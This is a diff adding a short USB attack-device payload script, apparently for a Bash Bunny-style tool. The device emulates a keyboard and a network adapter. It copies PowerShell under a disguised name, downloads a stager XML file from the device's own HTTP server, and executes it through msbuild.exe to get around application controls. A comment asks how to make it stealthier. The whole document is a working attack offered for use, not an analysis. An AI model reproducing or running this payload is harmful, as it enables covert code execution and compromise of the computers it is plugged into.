@@ -1,0 +1,33 @@
+#!/bin/bash
+# Delay is a work in progress, trying to improve effiencey. 
+# Can we make this stealthier?
+
+LED SETUP
+ATTACKMODE RNDIS_ETHERNET HID 
+
+# SETUP
+
+
+LED STAGE1
+gohttp -d=/home -p=80 &
+
+
+LED STAGE2
+# Default powershell path , may be nice to include some basic checks
+
+RUN WIN "cmd /c copy C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe C:\Temp\p.exe"
+
+
+Q DELAY 20000
+
+# RUN WIN "iexplore.exe http://172.16.64.1/stager.xml"
+
+RUN WIN "C:\Temp\p.exe Invoke-WebRequest http://172.16.64.1/stager.xml -OutFile C:\Temp\\stager.xml"
+
+# Q DELAY 10000
+
+
+RUN WIN "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe C:\Temp\stager.xml"
+
+
+LED FINISH  
